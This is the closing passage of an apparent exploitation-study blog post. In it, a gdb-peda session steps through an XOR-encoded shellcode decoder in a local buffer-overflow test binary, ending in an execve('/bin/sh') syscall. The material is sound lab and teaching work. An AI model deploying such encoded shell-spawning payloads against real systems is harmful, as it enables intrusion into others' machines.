value<br>0x00007fffffffde55 in ?? ()<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> ni</span><br>[----------------------------------registers-----------------------------------]<br>RAX: 0x7fffffffde38 --&gt; 0xffffef058d48ffff <br>RBX: 0xa6c7476227244955 <br>RCX: 0x2 <br>RDX: 0x0 <br>RSI: 0x4052a0 --&gt; 0xa21656e6f44 (&#x27;Done!\n&#x27;)<br>RDI: 0x7ffff7fa8670 --&gt; 0x0 <br>RBP: 0x9090909090909090 <br>RSP: 0x7fffffffdeb0 --&gt; 0x7fffffffdf98 --&gt; 0x7fffffffe2e1 (&quot;/home/kali/StackOverflowtest/bol_64&quot;)<br>RIP: 0x7fffffffde4b --&gt; 0xfff82d4827583148 <br>R8 : 0x6 <br>R9 : 0x7ffff7fa5c00 --&gt; 0x4056a0 --&gt; 0x0 <br>R10: 0x5d (&#x27;]&#x27;)<br>R11: 0x246 <br>R12: 0x401050 (&lt;_start&gt;:        xor    ebp,ebp)<br>R13: 0x0 <br>R14: 0x0 <br>R15: 0x0<br>EFLAGS: 0x213 (CARRY parity ADJUST zero sign trap INTERRUPT direction overflow)<br>[-------------------------------------code-------------------------------------]<br>   0x7fffffffde33:      sub    rcx,0xfffffffffffffffd<br>   0x7fffffffde3a:      lea    rax,[rip+0xffffffffffffffef]        # 0x7fffffffde30<br>   0x7fffffffde41:      movabs rbx,0xa6c7476227244955<br>=&gt; 0x7fffffffde4b:      xor    QWORD PTR [rax+0x27],rbx<br>   0x7fffffffde4f:      sub    rax,0xfffffffffffffff8<br>   0x7fffffffde55:      loop   0x7fffffffde4b<br>   0x7fffffffde57:      movabs rax,0x493d732f6e69622f<br>   0x7fffffffde61:      mov    ebp,0x95183677<br>[------------------------------------stack-------------------------------------]<br>0000| 0x7fffffffdeb0 --&gt; 0x7fffffffdf98 --&gt; 0x7fffffffe2e1 (&quot;/home/kali/StackOverflowtest/bol_64&quot;)<br>0008| 0x7fffffffdeb8 --&gt; 0x2f7fca000 <br>0016| 0x7fffffffdec0 --&gt; 0x401136 (&lt;main&gt;:      push   rbp)<br>0024| 0x7fffffffdec8 --&gt; 0x7fffffffe2c9 --&gt; 0x90b5e2d6fdf7c637 <br>0032| 0x7fffffffded0 --&gt; 0x401180 (&lt;__libc_csu_init&gt;:   push   r15)<br>0040| 0x7fffffffded8 --&gt; 0x16f43a298c00653d <br>0048| 0x7fffffffdee0 --&gt; 0x401050 (&lt;_start&gt;:    xor    ebp,ebp)<br>0056| 0x7fffffffdee8 --&gt; 0x0 <br>[------------------------------------------------------------------------------]<br>Legend: code, data, rodata, value<br>0x00007fffffffde4b in ?? ()<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> disass 0x7fffffffde30,0x7fffffffde70</span><br>Dump of assembler code from 0x7fffffffde30 to 0x7fffffffde70:<br>   0x00007fffffffde30:  xor    rcx,rcx<br>   0x00007fffffffde33:  sub    rcx,0xfffffffffffffffd<br>   0x00007fffffffde3a:  lea    rax,[rip+0xffffffffffffffef]        # 0x7fffffffde30<br>   0x00007fffffffde41:  movabs rbx,0xa6c7476227244955<br>=&gt; 0x00007fffffffde4b:  xor    QWORD PTR [rax+0x27],rbx<br>   0x00007fffffffde4f:  sub    rax,0xfffffffffffffff8<br>   0x00007fffffffde55:  loop   0x7fffffffde4b<br>   0x00007fffffffde57:  movabs rax,0x493d732f6e69622f<br>   0x00007fffffffde61:  mov    ebp,0x95183677<br>   0x00007fffffffde66:  clc    <br>   0x00007fffffffde67:  (bad)  <br>   0x00007fffffffde68:  jb     0x7fffffffdee6<br>   0x00007fffffffde6a:  sub    BYTE PTR [rdi+0x47],ah<br>   0x00007fffffffde6d:  (bad)  <br>   0x00007fffffffde6e:  cmps   BYTE PTR ds:[rsi],BYTE PTR es:[rdi]<br>   0x00007fffffffde6f:  nop<br>End of assembler dump.<br><span class="hljs-meta"></span><br><span class="hljs-meta">gdb-peda$</span><span class="bash"> ni</span><br>[----------------------------------registers-----------------------------------]<br>RAX: 0x7fffffffde38 --&gt; 0xffffef058d48ffff <br>RBX: 0xa6c7476227244955 <br>RCX: 0x2 <br>RDX: 0x0 <br>RSI: 0x4052a0 --&gt; 0xa21656e6f44 (&#x27;Done!\n&#x27;)<br>RDI: 0x7ffff7fa8670 --&gt; 0x0 <br>RBP: 0x9090909090909090 <br>RSP: 0x7fffffffdeb0 --&gt; 0x7fffffffdf98 --&gt; 0x7fffffffe2e1 (&quot;/home/kali/StackOverflowtest/bol_64&quot;)<br>RIP: 0x7fffffffde4f --&gt; 0xf4e2fffffff82d48 <br>R8 : 0x6 <br>R9 : 0x7ffff7fa5c00 --&gt; 0x4056a0 --&gt; 0x0 <br>R10: 0x5d (&#x27;]&#x27;)<br>R11: 0x246 <br>R12: 0x401050 (&lt;_start&gt;:        xor    ebp,ebp)<br>R13: 0x0 <br>R14: 0x0 <br>R15: 0x0<br>EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)<br>[-------------------------------------code-------------------------------------]<br>   0x7fffffffde3a:      lea    rax,[rip+0xffffffffffffffef]        # 0x7fffffffde30<br>   0x7fffffffde41:      movabs rbx,0xa6c7476227244955<br>   0x7fffffffde4b:      xor    QWORD PTR [rax+0x27],rbx<br>=&gt; 0x7fffffffde4f:      sub    rax,0xfffffffffffffff8<br>   0x7fffffffde55:      loop   0x7fffffffde4b<br>   0x7fffffffde57:      movabs rax,0x68732f6e69622f<br>   0x7fffffffde61:      cdq    <br>   0x7fffffffde62:      push   rax<br>[------------------------------------stack-------------------------------------]<br>0000| 0x7fffffffdeb0 --&gt; 0x7fffffffdf98 --&gt; 0x7fffffffe2e1 (&quot;/home/kali/StackOverflowtest/bol_64&quot;)<br>0008| 0x7fffffffdeb8 --&gt; 0x2f7fca000 <br>0016| 0x7fffffffdec0 --&gt; 0x401136 (&lt;main&gt;:      push   rbp)<br>0024| 0x7fffffffdec8 --&gt; 0x7fffffffe2c9 --&gt; 0x90b5e2d6fdf7c637 <br>0032| 0x7fffffffded0 --&gt; 0x401180 (&lt;__libc_csu_init&gt;:   push   r15)<br>0040| 0x7fffffffded8 --&gt; 0x16f43a298c00653d <br>0048| 0x7fffffffdee0 --&gt; 0x401050 (&lt;_start&gt;:    xor    ebp,ebp)<br>0056| 0x7fffffffdee8 --&gt; 0x0 <br>[------------------------------------------------------------------------------]<br>Legend: code, data, rodata, value<br>0x00007fffffffde4f in ?? ()<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> ni</span><br>[----------------------------------registers-----------------------------------]<br>RAX: 0x7fffffffde40 --&gt; 0x6227244955bb48ff <br>RBX: 0xa6c7476227244955 <br>RCX: 0x2 <br>RDX: 0x0 <br>RSI: 0x4052a0 --&gt; 0xa21656e6f44 (&#x27;Done!\n&#x27;)<br>RDI: 0x7ffff7fa8670 --&gt; 0x0 <br>RBP: 0x9090909090909090 <br>RSP: 0x7fffffffdeb0 --&gt; 0x7fffffffdf98 --&gt; 0x7fffffffe2e1 (&quot;/home/kali/StackOverflowtest/bol_64&quot;)<br>RIP: 0x7fffffffde55 --&gt; 0x6e69622fb848f4e2 <br>R8 : 0x6 <br>R9 : 0x7ffff7fa5c00 --&gt; 0x4056a0 --&gt; 0x0 <br>R10: 0x5d (&#x27;]&#x27;)<br>R11: 0x246 <br>R12: 0x401050 (&lt;_start&gt;:        xor    ebp,ebp)<br>R13: 0x0 <br>R14: 0x0 <br>R15: 0x0<br>EFLAGS: 0x203 (CARRY parity adjust zero sign trap INTERRUPT direction overflow)<br>[-------------------------------------code-------------------------------------]<br>   0x7fffffffde41:      movabs rbx,0xa6c7476227244955<br>   0x7fffffffde4b:      xor    QWORD PTR [rax+0x27],rbx<br>   0x7fffffffde4f:      sub    rax,0xfffffffffffffff8<br>=&gt; 0x7fffffffde55:      loop   0x7fffffffde4b<br>   0x7fffffffde57:      movabs rax,0x68732f6e69622f<br>   0x7fffffffde61:      cdq    <br>   0x7fffffffde62:      push   rax<br>   0x7fffffffde63:      push   rsp<br>[------------------------------------stack-------------------------------------]<br>0000| 0x7fffffffdeb0 --&gt; 0x7fffffffdf98 --&gt; 0x7fffffffe2e1 (&quot;/home/kali/StackOverflowtest/bol_64&quot;)<br>0008| 0x7fffffffdeb8 --&gt; 0x2f7fca000 <br>0016| 0x7fffffffdec0 --&gt; 0x401136 (&lt;main&gt;:      push   rbp)<br>0024| 0x7fffffffdec8 --&gt; 0x7fffffffe2c9 --&gt; 0x90b5e2d6fdf7c637 <br>0032| 0x7fffffffded0 --&gt; 0x401180 (&lt;__libc_csu_init&gt;:   push   r15)<br>0040| 0x7fffffffded8 --&gt; 0x16f43a298c00653d <br>0048| 0x7fffffffdee0 --&gt; 0x401050 (&lt;_start&gt;:    xor    ebp,ebp)<br>0056| 0x7fffffffdee8 --&gt; 0x0 <br>[------------------------------------------------------------------------------]<br>Legend: code, data, rodata, value<br>0x00007fffffffde55 in ?? ()<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> ni</span><br>[----------------------------------registers-----------------------------------]<br>RAX: 0x7fffffffde40 --&gt; 0x6227244955bb48ff <br>RBX: 0xa6c7476227244955 <br>RCX: 0x1 <br>RDX: 0x0 <br>RSI: 0x4052a0 --&gt; 0xa21656e6f44 (&#x27;Done!\n&#x27;)<br>RDI: 0x7ffff7fa8670 --&gt; 0x0 <br>RBP: 0x9090909090909090 <br>RSP: 0x7fffffffdeb0 --&gt; 0x7fffffffdf98 --&gt; 0x7fffffffe2e1 (&quot;/home/kali/StackOverflowtest/bol_64&quot;)<br>RIP: 0x7fffffffde4b --&gt; 0xfff82d4827583148 <br>R8 : 0x6 <br>R9 : 0x7ffff7fa5c00 --&gt; 0x4056a0 --&gt; 0x0 <br>R10: 0x5d (&#x27;]&#x27;)<br>R11: 0x246 <br>R12: 0x401050 (&lt;_start&gt;:        xor    ebp,ebp)<br>R13: 0x0 <br>R14: 0x0 <br>R15: 0x0<br>EFLAGS: 0x203 (CARRY parity adjust zero sign trap INTERRUPT direction overflow)<br>[-------------------------------------code-------------------------------------]<br>   0x7fffffffde33:      sub    rcx,0xfffffffffffffffd<br>   0x7fffffffde3a:      lea    rax,[rip+0xffffffffffffffef]        # 0x7fffffffde30<br>   0x7fffffffde41:      movabs rbx,0xa6c7476227244955<br>=&gt; 0x7fffffffde4b:      xor    QWORD PTR [rax+0x27],rbx<br>   0x7fffffffde4f:      sub    rax,0xfffffffffffffff8<br>   0x7fffffffde55:      loop   0x7fffffffde4b<br>   0x7fffffffde57:      movabs rax,0x68732f6e69622f<br>   0x7fffffffde61:      cdq<br>[------------------------------------stack-------------------------------------]<br>0000| 0x7fffffffdeb0 --&gt; 0x7fffffffdf98 --&gt; 0x7fffffffe2e1 (&quot;/home/kali/StackOverflowtest/bol_64&quot;)<br>0008| 0x7fffffffdeb8 --&gt; 0x2f7fca000 <br>0016| 0x7fffffffdec0 --&gt; 0x401136 (&lt;main&gt;:      push   rbp)<br>0024| 0x7fffffffdec8 --&gt; 0x7fffffffe2c9 --&gt; 0x90b5e2d6fdf7c637 <br>0032| 0x7fffffffded0 --&gt; 0x401180 (&lt;__libc_csu_init&gt;:   push   r15)<br>0040| 0x7fffffffded8 --&gt; 0x16f43a298c00653d <br>0048| 0x7fffffffdee0 --&gt; 0x401050 (&lt;_start&gt;:    xor    ebp,ebp)<br>0056| 0x7fffffffdee8 --&gt; 0x0 <br>[------------------------------------------------------------------------------]<br>Legend: code, data, rodata, value<br>0x00007fffffffde4b in ?? ()<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> disass 0x7fffffffde30,0x7fffffffde70</span><br>Dump of assembler code from 0x7fffffffde30 to 0x7fffffffde70:<br>   0x00007fffffffde30:  xor    rcx,rcx<br>   0x00007fffffffde33:  sub    rcx,0xfffffffffffffffd<br>   0x00007fffffffde3a:  lea    rax,[rip+0xffffffffffffffef]        # 0x7fffffffde30<br>   0x00007fffffffde41:  movabs rbx,0xa6c7476227244955<br>=&gt; 0x00007fffffffde4b:  xor    QWORD PTR [rax+0x27],rbx<br>   0x00007fffffffde4f:  sub    rax,0xfffffffffffffff8<br>   0x00007fffffffde55:  loop   0x7fffffffde4b<br>   0x00007fffffffde57:  movabs rax,0x68732f6e69622f<br>   0x00007fffffffde61:  cdq    <br>   0x00007fffffffde62:  push   rax<br>   0x00007fffffffde63:  push   rsp<br>   0x00007fffffffde64:  pop    rdi<br>   0x00007fffffffde65:  push   rdx<br>   0x00007fffffffde66:  pop    rsi<br>   0x00007fffffffde67:  (bad)  <br>   0x00007fffffffde68:  jb     0x7fffffffdee6<br>   0x00007fffffffde6a:  sub    BYTE PTR [rdi+0x47],ah<br>   0x00007fffffffde6d:  (bad)  <br>   0x00007fffffffde6e:  cmps   BYTE PTR ds:[rsi],BYTE PTR es:[rdi]<br>   0x00007fffffffde6f:  nop<br>End of assembler dump.<br><span class="hljs-meta"></span><br><span class="hljs-meta">gdb-peda$</span><span class="bash"> ni</span><br>[----------------------------------registers-----------------------------------]<br>RAX: 0x7fffffffde40 --&gt; 0x6227244955bb48ff <br>RBX: 0xa6c7476227244955 <br>RCX: 0x1 <br>RDX: 0x0 <br>RSI: 0x4052a0 --&gt; 0xa21656e6f44 (&#x27;Done!\n&#x27;)<br>RDI: 0x7ffff7fa8670 --&gt; 0x0 <br>RBP: 0x9090909090909090 <br>RSP: 0x7fffffffdeb0 --&gt; 0x7fffffffdf98 --&gt; 0x7fffffffe2e1 (&quot;/home/kali/StackOverflowtest/bol_64&quot;)<br>RIP: 0x7fffffffde4f --&gt; 0xf4e2fffffff82d48 <br>R8 : 0x6 <br>R9 : 0x7ffff7fa5c00 --&gt; 0x4056a0 --&gt; 0x0 <br>R10: 0x5d (&#x27;]&#x27;)<br>R11: 0x246 <br>R12: 0x401050 (&lt;_start&gt;:        xor    ebp,ebp)<br>R13: 0x0 <br>R14: 0x0 <br>R15: 0x0<br>EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)<br>[-------------------------------------code-------------------------------------]<br>   0x7fffffffde3a:      lea    rax,[rip+0xffffffffffffffef]        # 0x7fffffffde30<br>   0x7fffffffde41:      movabs rbx,0xa6c7476227244955<br>   0x7fffffffde4b:      xor    QWORD PTR [rax+0x27],rbx<br>=&gt; 0x7fffffffde4f:      sub    rax,0xfffffffffffffff8<br>   0x7fffffffde55:      loop   0x7fffffffde4b<br>   0x7fffffffde57:      movabs rax,0x68732f6e69622f<br>   0x7fffffffde61:      cdq    <br>   0x7fffffffde62:      push   rax<br>[------------------------------------stack-------------------------------------]<br>0000| 0x7fffffffdeb0 --&gt; 0x7fffffffdf98 --&gt; 0x7fffffffe2e1 (&quot;/home/kali/StackOverflowtest/bol_64&quot;)<br>0008| 0x7fffffffdeb8 --&gt; 0x2f7fca000 <br>0016| 0x7fffffffdec0 --&gt; 0x401136 (&lt;main&gt;:      push   rbp)<br>0024| 0x7fffffffdec8 --&gt; 0x7fffffffe2c9 --&gt; 0x90b5e2d6fdf7c637 <br>0032| 0x7fffffffded0 --&gt; 0x401180 (&lt;__libc_csu_init&gt;:   push   r15)<br>0040| 0x7fffffffded8 --&gt; 0x16f43a298c00653d <br>0048| 0x7fffffffdee0 --&gt; 0x401050 (&lt;_start&gt;:    xor    ebp,ebp)<br>0056| 0x7fffffffdee8 --&gt; 0x0 <br>[------------------------------------------------------------------------------]<br>Legend: code, data, rodata, value<br>0x00007fffffffde4f in ?? ()<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> ni</span><br>[----------------------------------registers-----------------------------------]<br>RAX: 0x7fffffffde48 --&gt; 0x4827583148a6c747 <br>RBX: 0xa6c7476227244955 <br>RCX: 0x1 <br>RDX: 0x0 <br>RSI: 0x4052a0 --&gt; 0xa21656e6f44 (&#x27;Done!\n&#x27;)<br>RDI: 0x7ffff7fa8670 --&gt; 0x0 <br>RBP: 0x9090909090909090 <br>RSP: 0x7fffffffdeb0 --&gt; 0x7fffffffdf98 --&gt; 0x7fffffffe2e1 (&quot;/home/kali/StackOverflowtest/bol_64&quot;)<br>RIP: 0x7fffffffde55 --&gt; 0x6e69622fb848f4e2 <br>R8 : 0x6 <br>R9 : 0x7ffff7fa5c00 --&gt; 0x4056a0 --&gt; 0x0 <br>R10: 0x5d (&#x27;]&#x27;)<br>R11: 0x246 <br>R12: 0x401050 (&lt;_start&gt;:        xor    ebp,ebp)<br>R13: 0x0 <br>R14: 0x0 <br>R15: 0x0<br>EFLAGS: 0x217 (CARRY PARITY ADJUST zero sign trap INTERRUPT direction overflow)<br>[-------------------------------------code-------------------------------------]<br>   0x7fffffffde41:      movabs rbx,0xa6c7476227244955<br>   0x7fffffffde4b:      xor    QWORD PTR [rax+0x27],rbx<br>   0x7fffffffde4f:      sub    rax,0xfffffffffffffff8<br>=&gt; 0x7fffffffde55:      loop   0x7fffffffde4b<br>   0x7fffffffde57:      movabs rax,0x68732f6e69622f<br>   0x7fffffffde61:      cdq    <br>   0x7fffffffde62:      push   rax<br>   0x7fffffffde63:      push   rsp<br>[------------------------------------stack-------------------------------------]<br>0000| 0x7fffffffdeb0 --&gt; 0x7fffffffdf98 --&gt; 0x7fffffffe2e1 (&quot;/home/kali/StackOverflowtest/bol_64&quot;)<br>0008| 0x7fffffffdeb8 --&gt; 0x2f7fca000 <br>0016| 0x7fffffffdec0 --&gt; 0x401136 (&lt;main&gt;:      push   rbp)<br>0024| 0x7fffffffdec8 --&gt; 0x7fffffffe2c9 --&gt; 0x90b5e2d6fdf7c637 <br>0032| 0x7fffffffded0 --&gt; 0x401180 (&lt;__libc_csu_init&gt;:   push   r15)<br>0040| 0x7fffffffded8 --&gt; 0x16f43a298c00653d <br>0048| 0x7fffffffdee0 --&gt; 0x401050 (&lt;_start&gt;:    xor    ebp,ebp)<br>0056| 0x7fffffffdee8 --&gt; 0x0 <br>[------------------------------------------------------------------------------]<br>Legend: code, data, rodata, value<br>0x00007fffffffde55 in ?? ()<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> ni</span><br>[----------------------------------registers-----------------------------------]<br>RAX: 0x7fffffffde48 --&gt; 0x4827583148a6c747 <br>RBX: 0xa6c7476227244955 <br>RCX: 0x0 <br>RDX: 0x0 <br>RSI: 0x4052a0 --&gt; 0xa21656e6f44 (&#x27;Done!\n&#x27;)<br>RDI: 0x7ffff7fa8670 --&gt; 0x0 <br>RBP: 0x9090909090909090 <br>RSP: 0x7fffffffdeb0 --&gt; 0x7fffffffdf98 --&gt; 0x7fffffffe2e1 (&quot;/home/kali/StackOverflowtest/bol_64&quot;)<br>RIP: 0x7fffffffde57 --&gt; 0x732f6e69622fb848 <br>R8 : 0x6 <br>R9 : 0x7ffff7fa5c00 --&gt; 0x4056a0 --&gt; 0x0 <br>R10: 0x5d (&#x27;]&#x27;)<br>R11: 0x246 <br>R12: 0x401050 (&lt;_start&gt;:        xor    ebp,ebp)<br>R13: 0x0 <br>R14: 0x0 <br>R15: 0x0<br>EFLAGS: 0x217 (CARRY PARITY ADJUST zero sign trap INTERRUPT direction overflow)<br>[-------------------------------------code-------------------------------------]<br>   0x7fffffffde4b:      xor    QWORD PTR [rax+0x27],rbx<br>   0x7fffffffde4f:      sub    rax,0xfffffffffffffff8<br>   0x7fffffffde55:      loop   0x7fffffffde4b<br>=&gt; 0x7fffffffde57:      movabs rax,0x68732f6e69622f<br>   0x7fffffffde61:      cdq    <br>   0x7fffffffde62:      push   rax<br>   0x7fffffffde63:      push   rsp<br>   0x7fffffffde64:      pop    rdi<br>[------------------------------------stack-------------------------------------]<br>0000| 0x7fffffffdeb0 --&gt; 0x7fffffffdf98 --&gt; 0x7fffffffe2e1 (&quot;/home/kali/StackOverflowtest/bol_64&quot;)<br>0008| 0x7fffffffdeb8 --&gt; 0x2f7fca000 <br>0016| 0x7fffffffdec0 --&gt; 0x401136 (&lt;main&gt;:      push   rbp)<br>0024| 0x7fffffffdec8 --&gt; 0x7fffffffe2c9 --&gt; 0x90b5e2d6fdf7c637 <br>0032| 0x7fffffffded0 --&gt; 0x401180 (&lt;__libc_csu_init&gt;:   push   r15)<br>0040| 0x7fffffffded8 --&gt; 0x16f43a298c00653d <br>0048| 0x7fffffffdee0 --&gt; 0x401050 (&lt;_start&gt;:    xor    ebp,ebp)<br>0056| 0x7fffffffdee8 --&gt; 0x0 <br>[------------------------------------------------------------------------------]<br>Legend: code, data, rodata, value<br>0x00007fffffffde57 in ?? ()<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> disass 0x7fffffffde30,0x7fffffffde70</span><br>Dump of assembler code from 0x7fffffffde30 to 0x7fffffffde70:<br>   0x00007fffffffde30:  xor    rcx,rcx<br>   0x00007fffffffde33:  sub    rcx,0xfffffffffffffffd<br>   0x00007fffffffde3a:  lea    rax,[rip+0xffffffffffffffef]        # 0x7fffffffde30<br>   0x00007fffffffde41:  movabs rbx,0xa6c7476227244955<br>   0x00007fffffffde4b:  xor    QWORD PTR [rax+0x27],rbx<br>   0x00007fffffffde4f:  sub    rax,0xfffffffffffffff8<br>   0x00007fffffffde55:  loop   0x7fffffffde4b<br>=&gt; 0x00007fffffffde57:  movabs rax,0x68732f6e69622f<br>   0x00007fffffffde61:  cdq    <br>   0x00007fffffffde62:  push   rax<br>   0x00007fffffffde63:  push   rsp<br>   0x00007fffffffde64:  pop    rdi<br>   0x00007fffffffde65:  push   rdx<br>   0x00007fffffffde66:  pop    rsi<br>   0x00007fffffffde67:  push   0x3b<br>   0x00007fffffffde69:  pop    rax<br>   0x00007fffffffde6a:  syscall <br>   0x00007fffffffde6c:  add    BYTE PTR [rax],al<br>   0x00007fffffffde6e:  add    BYTE PTR [rax-0x6f6f6f70],dl<br>End of assembler dump.<br></code></pre></td></tr></table></figure>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                  <div class="post-meta mr-3">
                    <i class="iconfont icon-category"></i>
                    
                      <a class="hover-with-bg" href="/categories/Pwn/">Pwn</a>
                    
                  </div>
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="/tags/Linux/">Linux</a>
                    
                      <a class="hover-with-bg" href="/tags/Pwn/">Pwn</a>
                    
                      <a class="hover-with-bg" href="/tags/Buffer-Overflow/">Buffer Overflow</a>
                    
                  </div>
                
              </div>
              
                <p class="note note-warning">
                  
                    Êú¨ÂçöÂÆ¢ÊâÄÊúâÊñáÁ´†Èô§ÁâπÂà´Â£∞ÊòéÂ§ñÔºåÂùáÈááÁî® <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 ÂçèËÆÆ</a> ÔºåËΩ¨ËΩΩËØ∑Ê≥®ÊòéÂá∫Â§ÑÔºÅ
                  
                </p>
              
              
                <div class="post-prevnext">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2022/07/10/Penetration/Vulnhub/Part-1/0x0C%20SickOs-1.1/">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">SickOsÔºö1.1</span>
                        <span class="visible-mobile">‰∏ä‰∏ÄÁØá</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2022/07/04/Code/Python/python%E5%B8%B8%E8%A7%81%E6%8A%A5%E9%94%99/">
                        <span class="hidden-mobile">PythonÂ∏∏ËßÅÊä•Èîô</span>
                        <span class="visible-mobile">‰∏ã‰∏ÄÁØá</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;ÁõÆÂΩï</p>
  <div class="toc-body" id="toc-body"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    

    
      <a id="scroll-top-button" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">ÊêúÁ¥¢</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">ÂÖ≥ÈîÆËØç</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
    

    
  </main>

  <footer class="text-center mt-5 py-3">
  <div class="footer-content">
     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
  </div>
  

  

  
</footer>


  <!-- SCRIPTS -->
  
  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>

<!-- Plugins -->


  
    <script  src="/js/img-lazyload.js" ></script>
  



  



  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>



  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>



  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>



  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>



  <script  src="/js/local-search.js" ></script>






  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var title = document.getElementById('subtitle').title;
      
      typing(title)
      
    })(window, document);
  </script>












  

  

  

  

  

  





<!-- ‰∏ªÈ¢òÁöÑÂêØÂä®È°π ‰øùÊåÅÂú®ÊúÄÂ∫ïÈÉ® -->
<script  src="/js/boot.js" ></script>


</body>
</html>
